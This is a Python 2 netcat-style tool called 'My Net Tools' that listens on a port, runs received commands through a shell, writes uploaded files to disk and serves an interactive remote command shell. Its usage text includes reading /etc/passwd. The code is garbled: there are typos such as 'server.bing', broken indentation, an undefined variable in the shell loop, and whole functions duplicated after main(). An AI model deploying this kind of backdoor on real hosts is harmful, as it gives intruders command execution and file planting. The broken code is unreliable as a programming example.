import os
import sys
import socket
import getopt
import threading
import subprocess

# define global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

# Main function responsible for handling CLI args and calling other functions
def client_sender(buffer):
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # connect to the target host
        client.connect((target,port))
        
        if len(buffer):
            client.send(buffer)
            
        while True:
            
            # wait to receive data back
            recv_len = 1
            response = ""
            
            while recv_len:
                
                data = client.recv(4096)
                recv_len = len(data)
                response+= data
                
                if recv_len < 4096:
                    break
                
                print response, 
                
                #wait for more input
                buffer = raw_input("")
                buffer += "\n"
                
                # send buffer
                client.send(buffer)
                
                
    except:
        
        print "[*] Exception! Exiting."
        
        # remove connection
        client.close()
        
def server_loop():
    global target
    
    if not len(target):
		target = "0.0.0.0"
		
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bing((target, port))
	server.listen(5)
	
	while True:
		client_socket, addr = server.accept()
		
		# Make a thread to handle the client
		client_thread = threading.Thread(target = client_handler, args = (client_socket,))
		client_thread.start()
		
def run_command(command):
	
	#trim the newline
	command = command.rstrip()
	
	# run the command
	try:
		output = subprocess.check_output(command, stderr = subprocess.STDOUT, shell = True)
	except:
		output = "Failed to execute command. \r\n"
		
	return output

def client_handler(client_socket):
	global upload
	global execute
	global command
	
	# check for upload
	if len(upload_destination):
		
		# reads in all the bytes and writes to our destination
		file_buffer = ""
		
		# keep reading data until none
		
		while True:
			data = client_socket.recv(1024)
			
			if not data:
				break
			else:
				file_buffer += data
			
		# Take the bytes and write them out
		try:
			file_descriptor = open(upload_destination, "wb")
			file_descriptor.write(file_buffer)
			file_descriptor.close()
			
			# ACK that file was written
			client_socket.send("Successfully saved the file to %s\r\n" % upload_destination)
		except:
			client_socket.send("Failed to save file to %s\r\n" % upload_destination)
			
	# check for command execution
	if len(execute):
		
		# run the command
		output = run_command(execute)
		
		client_socket.send(output)
		
	# go into a loop if a command shell was requested
	if command:
	
		while True:
			# display a basic prompt
			client_socket.send(output)
			
			# end data receiving when we encounter a line feed (enter key)
			cmd_buffer = ""
			while "\n" not in cmd_buffer:
				cmd_buffer += client_socket.recv(1024)
				
			# send back the command output
			response = run_command(cmd_buffer)
			
			# send back the response
			client_socket.send(response)
def usage():
    print "My Net Tools"
    print
    print "Usage: mynettools.py -t target_host -p port"
    print "-l --listen                 - listen on [host]:[port] for incoming connections"
    print "-e --execute=file_to_run    - execute the given file upon receiving a connection"
    print "-c -command                 - initialize a command shell"
    print "-u --upload=destination     - upon receiving connections upload a file and write to [destination]"
    
    print
    print
    print "Examples: "
    print "mynettools.py -t 192.168.0.1 -p 5555 -l -c"
    print "mynettools.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "mynettools.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./mynettools.py -t 192.168.0.2 -p 135"
    sys.exit(0)
    
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if not len(sys.argv[1:]):
        usage()
        
    # read the command line options
    
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",
                                   ["help","listen","execute","target","port","command","upload"])
    except get.GetoptError as err:
        print str(err)
        usage()
        
    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e","--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"
            
    # are we going to listen or just send data from stdin?
    
    if not listen and len(target) and port > 0:
        
        # read in the buffer from the command line
        # this will block, so send CTRL-D if not sending input
        # to stdin
        buffer = sys.stdin.read()
        
        #send data off
        client_sender(buffer)
        
    #we are going to listen and upload files and execute commands
    #drop a shell back depending on the CLI options listed
    
    if listen:
        server_loop()
        
        
main()

def client_sender(buffer):
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # connect to the target host
        client.connect((target,port))
        
        if len(buffer):
            client.send(buffer)
            
        while True:
            
            # wait to receive data back
            recv_len = 1
            response = ""
            
            while recv_len:
                
                data = client.recv(4096)
                recv_len = len(data)
                response+= data
                
                if recv_len < 4096:
                    break
                
                print response, 
                
                #wait for more input
                buffer = raw_input("")
                buffer += "\n"
                
                # send buffer
                client.send(buffer)
                
                
    except:
        
        print "[*] Exception! Exiting."
        
        # remove connection
        client.close()
        
def server_loop():
    global target
    
    if not len(target):
		target = "0.0.0.0"
		
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bing((target, port))
	server.listen(5)
	
	while True:
		client_socket, addr = server.accept()
		
		# Make a thread to handle the client
		client_thread = threading.Thread(target = client_handler, args = (client_socket,))
		client_thread.start()
		
def run_command(command):
	
	#trim the newline
	command = command.rstrip()
	
	# run the command
	try:
		output = subprocess.check_output(command, stderr = subprocess.STDOUT, shell = True)
	except:
		output = "Failed to execute command. \r\n"
		
	return output

def client_handler(client_socket):
	global upload
	global execute
	global command
	
	# check for upload
	if len(upload_destination):
		
		# reads in all the bytes and writes to our destination
		file_buffer = ""
		
		# keep reading data until none
		
		while True:
			data = client_socket.recv(1024)
			
			if not data:
				break
			else:
				file_buffer += data
			
		# Take the bytes and write them out
		try:
			file_descriptor = open(upload_destination, "wb")
			file_descriptor.write(file_buffer)
			file_descriptor.close()
			
			# ACK that file was written
			client_socket.send("Successfully saved the file to %s\r\n" % upload_destination)
		except:
			client_socket.send("Failed to save file to %s\r\n" % upload_destination)
			
	# check for command execution
	if len(execute):
		
		# run the command
		output = run_command(execute)
		
		client_socket.send(output)
		
	# go into a loop if a command shell was requested
	if command:
	
		while True:
			# display a basic prompt
			client_socket.send(output)
			
			# end data receiving when we encounter a line feed (enter key)
			cmd_buffer = ""
			while "\n" not in cmd_buffer:
				cmd_buffer += client_socket.recv(1024)
				
			# send back the command output
			response = run_command(cmd_buffer)
			
			# send back the response
			client_socket.send(response)

    
